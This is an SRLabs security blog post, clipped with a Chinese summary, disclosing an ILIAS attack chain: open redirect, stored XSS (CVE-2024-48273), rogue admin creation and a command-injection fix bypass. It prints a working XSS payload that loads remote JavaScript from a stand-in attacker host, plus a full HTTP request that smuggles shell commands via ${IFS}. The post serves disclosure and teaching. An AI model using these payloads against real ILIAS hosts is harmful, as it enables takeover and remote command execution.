---
title: "Breaking ILIAS #1: From Open Redirect to Admin - SRLabs Research"
source: https://srlabs.de/blog/breaking-ilias-part-1-from-open-redirect-to-admin
source_host: srlabs.de
clip_date: 2026-10-16T10:31:10+08:00
trace_id: 778c995f-7818-42e2-82ee-905fff68ed74
content_hash: 6b114a4da7bfbf6d20bd3db8325e8e0eea7deac5290ce8f31aa3e752387f82cc
status: synced
tags:
  - 漏洞分析
  - Web安全
series: null
feed_source: SRLabs·模糊测试/漏洞审计
ai_summary: ILIAS 8/9 存在开放重定向与存储型 XSS，配合不完整的命令注入修复绕过，可让未认证攻击者链式取得管理员权限并在主机上执行任意命令。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3fb75244-d011-814d-b5de-d76c53c71762
ioc:
  cves:
    - CVE-2024-48273
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> ILIAS 8/9 存在开放重定向与存储型 XSS，配合不完整的命令注入修复绕过，可让未认证攻击者链式取得管理员权限并在主机上执行任意命令。
> 
> - **入口—开放重定向：** `/Modules/LTIConsumer/ltiregstart.php` 的 `url` 参数接受任意地址并以 304 跳转，可伪造可信链接钓鱼；影响 `<=9.5`、`<=8.16`。跳转时会附带 `registration_token`，成为下一步的 Bearer 令牌。
> - **存储型 XSS（CVE-2024-48273）：** 用该 token 向 `/Modules/LTIConsumer/ltiregistration.php` POST，`client_name` 字段未净化直接入库；管理员打开 LTI 页面即执行。因 `client_name` 列仅 256 字符，改为注入 `<script>` 加载外部 JS 以承载任意长度载荷；影响 `<=7.9.16`、`<=8.1.16`、`<=8.2.3`。
> - **越权到管理员：** 借助管理端 XML 批量导入账号功能，由 XSS 以管理员浏览器上下文创建新管理员账号，绕过全部授权检查，在应用层获得 root 级权限。
> - **命令注入绕过：** 8.12 对已知注入的修复不完整（8.13 才修好）。PDF 生成设置的 `checkbox_svg` 参数缺少校验，用 `;` 截断原 `wkhtmltopdf` 命令、以 `${IFS}` 代替空格，经 PHP `exec()` 以 PHP 进程权限执行命令；再自动创建 Portfolio 并触发导出以主动触发。影响 `<=7.30`、`<8.13`。
> - **披露时间线：** 2024-10-24 申请 CVE，10-28 通知厂商，12-10 在 8.17/9.6 修复，2025-09-24 公开。

![](https://srlabs.de/img/assets/authors/srl_headshot_rene_rehme-320.519db33e31.avif)

We describe two previously unknown vulnerabilities affecting versions 8 and 9 of the widely used learning management system [ILIAS](https://ilias.de/). In combination, the vulnerabilities enable unauthenticated users to gain ILIAS administrative access. OS command injection can be achieved by leveraging a bypass of an incomplete fix for an already known vulnerability. We reported the vulnerabilities through our responsible disclosure process. With patches now in place, we can share the details here.

## Background

ILIAS vulnerabilities played a role in high-profile broad compromises. The most prominent ILIAS breach resulted in the 2018 partial compromise of the German Federal Government [1](#fn:1). Attackers exploited known vulnerabilities in an outdated version of ILIAS hosted by the German Federal Academy of Public Administration. Through cleverly crafted course offerings, the attackers managed to infect 17 endpoints in the Federal Foreign Office, exfiltrated confidential documents and began to move laterally in the governmental network.

## Today’s walkthrough

We explore similar vulnerabilities and their impact when chained together.

First, we identify an **open redirect**. We use this open redirect to obtain a bearer token and achieve a **stored XSS**. We then demonstrate how the stored XSS can be leveraged to **create an administrative account**, and to **achieve command execution** in ILIAS versions 8.11. and 8.12.

### Vulnerability #1: Open redirect

We start at the `/Modules/LTIConsumer/ltiregstart.php` endpoint that implements registration for the learning tool interoperability (LTI) standard. This standard allows a learning platform to launch and securely communicate with external tools that also support this standard. Administrators (with the correct permissions) can use `/Modules/LTIConsumer/ltiregstart.php` to register and authenticate new tools with their ILIAS instance for later use.

The endpoint accepts any URL via the `url` parameter, which specifies the target host ILIAS subsequently redirects to via an HTTP 304 response. ILIAS appends further query parameters to the redirect using an ampersand (`&`). To exploit this behavior effectively, an initial preceding parameter has to be included once with a preceding (`&`): for instance: `/Modules/LTIConsumer/ltiregstart.php?url=https://srlabs.de/?d=a`

![Open redirect](https://srlabs.de/img/content/blog/post-assets/breaking-ilias-part-1-from-open-redirect-to-admin/0-open-redirect-320.83c2005ed4.avif)

Figure 1: Open redirect facilitating phishing attacks or malicious downloads

Attackers can abuse this open redirect to craft malicious links that appear to point to a trusted domain. Unsuspecting users can then be redirected to phishing websites or malicious downloads.

As open redirects rarely pose an immediate threat to the application’s integrity, they are commonly rated uncritical.

-   **Impact:** Creation of seemingly trusted links to malicious websites
-   **Vulnerable ILIAS versions:** `<=9.5`, `<=8.16`

While the open redirect was interesting but not directly exploitable without user interaction, we saw a `registration_token` added to the redirects to our domain — let‘s have a closer look…

### Vulnerability #2: Stored XSS (CVE-2024-48273)

The aforementioned ILIAS LTI module is responsible for the integration of external tools. A lack of proper input validation allows us to inject malicious code via user-controlled fields. The required endpoints are accessible without authentication, significantly lowering the barrier for exploitation.

1.  **Obtain registration token**

We begin by abusing the endpoint `/Modules/LTIConsumer/ltiregstart.php?url=https://srlabs.de/?d=test` — which enables open redirects, as described above. ILIAS redirects our request to `https://srlabs.de` and adds a `registration_token` URL parameter. This token is handed to new client applications to start the registration process. While not strictly secret, it allows us to interact with the full registration endpoint in the next step. Figure 2 illustrates this process.

![Obtain registration token](https://srlabs.de/img/content/blog/post-assets/breaking-ilias-part-1-from-open-redirect-to-admin/1-token-320.d72b76ed05.avif)

Figure 2: We obtain an LTI registration token via ltiregstart.php

2.  **Post stored XSS**

We use this obtained token as bearer token and send a POST request to the `/Modules/LTIConsumer/ltiregistration.php` endpoint. In the POST body, we provide an XSS payload in the `client_parameter` field. The resulting payload looks like this:

```json
{
  "client_name": "LTI-Test<script\>alert(\"owned\")</script\>",
  "initiate_login_uri": "1",
  "redirect_uris": {"1": "1"},
  "jwks_uri": "1",
  "https://purl.imsglobal.org/spec/lti-tool-configuration": {
    "target_link_uri": "1",
    "deployment_id": "",
    "messages": {}
  }
}
```

Because of insufficient sanitization, our `client_name` value is stored in the database without modification. Once an administrator visits the LTI section in ILIAS, our payload is retrieved from the database and embedded in the HTML response. Figure 3 summarizes the required steps to achieve XSS on a vulnerable ILIAS instance.

![Stored XSS](https://srlabs.de/img/content/blog/post-assets/breaking-ilias-part-1-from-open-redirect-to-admin/2-XSS-320.05916c711c.avif)

Figure 3: We leverage the LTI registration for a stored XSS attack

3.  **Create administrative account**

Looking for ways to exploit this stored XSS with highest impact, we investigate the administrative functionalities ILIAS offers to authenticated admins. For account management, an XML import feature enables bulk creation of accounts. We abuse this by injecting XML to create a new administrator account. Luckily, we can do so directly from our stored XSS which we obtained in the previous step.

However, we face a problem: the underlying database column used to store the `client_name` only allows for up to 256 characters, severely limiting the maximum complexity of our payload. To have enough characters to trigger the XML import and create our very own administrator account, we need to get creative. Instead of directly embedding our final payload in the parameter directly, we inject a `<script>` tag pointing to an externally hosted JavaScript payload hosted on a domain under our control. The resulting payload looks like this:

```json
{
  "client_name": "LTI-Test<script>fetch(\"https://attacker.tld/payload.js\").then(c=>c.text()).then(c=>{eval(atob(c))})</script>",
  "initiate_login_uri": "1",
  "redirect_uris": {"1": "1"},
  "jwks_uri": "1",
  "https://purl.imsglobal.org/spec/lti-tool-configuration": {
    "target_link_uri": "1",
    "deployment_id": "",
    "messages": {}
  }
}
```

Once an admin visits the LTI section in ILIAS, our `<script>` tag is fetched from the database and embedded in the HTML page. The victim’s browser fetches our externally hosted JavaScript payload and executes it in the context of the administrator, allowing us to use arbitrarily large payloads without any user interaction. The full external payload that imports the admin account is omitted for brevity, but Figure 4 gives an overview about the steps required for admin account creation.

![Admin account creation](https://srlabs.de/img/content/blog/post-assets/breaking-ilias-part-1-from-open-redirect-to-admin/3-admin-320.22ebb4078a.avif)

Figure 4: We leverage the stored XSS to create an administrative user

As a result, we have bypassed all authorization checks and escalated to root privileges at the application level. This attack chain demonstrates how unsanitized user input can lead to broad compromise.

-   **Impact:** Privilege escalation to administrator role on application level
-   **Vulnerable versions:** `<=7.9.16`, `<=8.1.16`, `<=8.2.3`

### Bonus: Bypassing a vulnerability fix for host-level command injection

The XSS can also be leveraged to perform a command injection and achieve command execution on the ILIAS host. ILIAS version 8.11 is known to provide a convenient command injection vulnerability. By leveraging this vulnerability within the admin panel, we can execute commands on the host in the context of the PHP interpreter that runs ILIAS.

Unfortunately, our target host is running ILIAS version 8.12, so yet again we have to get creative. The first attempt to fix the command injection vulnerability in ILIAS 8.11 was made in release version 8.12. However, the fix was incomplete, and only ILIAS Version 8.13 eventually contained a proper fix (although no CVE was requested).

For our ILIAS v8.12 target, we craft a payload that interacts with an administrative endpoint to configure PDF generation settings. The endpoint accepts our preferred settings as parameters and writes them to the database. Only ILIAS’ incomplete input validation is between us and a good old code execution.

We find missing validation in the `checkbox_svg` parameter, allowing us to terminate the intended PDF generation command and append additional commands using a semicolon (`;`). As we cannot use spaces (due to the way ILIAS assembles the shell command), we leverage the internal field separator (IFS) as a substitute. The resulting parameter value looks like this:

`0"${IFS}/etc/passwd${IFS}/tmp/x.pdf${IFS};${IFS}<REALLY_BAD_STUFF>${IFS};/usr/bin/wkhtmltopdf${IFS}"`

The first part terminates the regular PDF export command by appending the only two strictly required arguments to `wkhtmltopdf`: input and output file. We choose `/etc/passwd` for the input file (as this is guaranteed to exist on Unix) and `/tmp/x.pdf` for the output file (as the process likely has write permissions in `/tmp`). The second part contains our actual payload we want to execute on the host as regular shell command (also separated by `${IFS}`). The third and final part re-appends the original `wkhtmltopdf` binary such that the assembled command remains functional.

The full POST request to the settings endpoint looks as follows. We send this request from the external payload fetched via the stored XSS in the context of the admin. Note that the body content is URL encoded as original settings dialog in ILIAS uses a form to submit these values:

```http
POST /ilias.php?baseClass=iladministrationgui&cmdNode=27:o4&cmdClass=ilObjPDFGenerationGUI&cmd=post&fallbackCmd=view&ref_id=67&rtoken=$RTOKEN HTTP/2
Host: $TARGET_HOST
Cookie: ilClientId=myilias; PHPSESSID=$PHP_SESSION_ID;
Content-Length: 822
Content-Type: application/x-www-form-urlencoded

path=%2Fusr%2Flocal%2Fbin%2Fwkhtmltopdf
&external_links=1
&javascript_delay=500
&checkbox_svg=0%22%24%7BIFS%7D%2Fetc%2Fpasswd%24%7BIFS%7D%2Ftmp%2Fx.pdf%24%7BIFS%7D%3B%24%7BIFS%7D%3CREALLY_BAD_STUFF%3E%24%7BIFS%7D%3B%2Fusr%2Fbin%2Fwkhtmltopdf%24%7BIFS%7D
&checkbox_checked_svg=
&radio_button_svg=
&radio_button_checked_svg=
[-- 24 more settings as URL params --]
&renderer=WkhtmlToPdf
&selected_Portfolio%3A%3AContentExport=0
&cmd%5BsaveConfig%5D=Save
```

The `checkbox_svg` parameter contains our injected commands to execute. Once PDF generation is triggered, for instance by the Portfolio export feature, our settings are retrieved from the database and added to a bash command string which is then executed via PHP‘s well-known `exec()` function.

Although PDF exports happened regularly on large ILIAS instances for a variety of reasons, we do not want to wait on this to happen. Thus, we extend the JavaScript payload to not only trigger the settings change as described above but to also create a Portfolio (a specific ILIAS object type) and to request a PDF export of the newly created Portfolio — triggering our payload and achieving command execution on the host.

![Execute injected command](https://srlabs.de/img/content/blog/post-assets/breaking-ilias-part-1-from-open-redirect-to-admin/4-command-injection-320.17c170c669.avif)

Figure 5: We leverage the stored XSS to modify PDF export settings and achieve code execution

Figure 5 shows the complete process of injecting the command into the PDF export settings and triggering a Portfolio export to achieve code execution. Alternatively, we could have triggered these actions also via the GUI using our created admin account. The result in both cases is command execution on the host with the permission level of the PHP interpreter running ILIAS which could be leveraged for further privilege escalation.

-   **Impact:** Command execution in PHP user context on the host running ILIAS
-   **Vulnerable versions:** `<=7.30`, `<8.13`

## Conclusion

We found two previously unknown security vulnerabilities and described a bypass for a supposedly patched one. In combination, the vulnerabilities enable administrator-level application access as well as code execution in the PHP interpreter context on any unpatched ILIAS host with only minimal required interaction from legitimate administrators.

This attack path proved pivotal in one of our red-team engagements and demonstrates how seemingly unrelated flaws in a complex application like ILIAS can be chained to achieve full, high-impact compromise.

If this kind of work excites you, you might be a great fit to one of our teams! Check our [careers page](https://srlabs.de/careers) for open positions.

*This blog post is part one of a two-part series on security vulnerabilities in ILIAS:*

-   [**Breaking ILIAS #1**: From Open Redirect to Admin](https://srlabs.de/blog/breaking-ilias-part-1-from-open-redirect-to-admin)
-   [**Breaking ILIAS #2**: Three Ways to RCE](https://srlabs.de/blog/breaking-ilias-part-2-three-to-rce)

## Responsible Disclosure

As per standard practice, we disclosed all identified vulnerabilities to the vendor before publishing this blog post. The full disclosure timeline is provided below.

-   **2024-10-24**: Requested CVE ID from MITRE
-   **2024-10-28**: Notified vendor
-   **2024-12-10**: Vulnerabilities patched in new releases (8.17, 9.6)
-   **2025-09-24**: Publication of this blog post and CVE ID

## Advisories & Release Notes

-   [CVE-2024-48273: XSS Vulnerability in LTI module](https://nvd.nist.gov/vuln/detail/CVE-2024-48273)
-   [ILIAS Release Notes 8.17](https://docu.ilias.de/go/pg/197871_35)
-   [ILIAS Release Notes 9.6](https://docu.ilias.de/go/pg/197847_35)

## References

1.  [Hack auf Bundesregierung erfolgte über Lernplattform Ilias](https://www.golem.de/news/bundeshack-hack-auf-bundesregierung-erfolgte-ueber-lernplattform-ilias-1803-133227.html). 8. March 2018, visited at 20. March 2025. [↩](#fnref:1 "return to article")
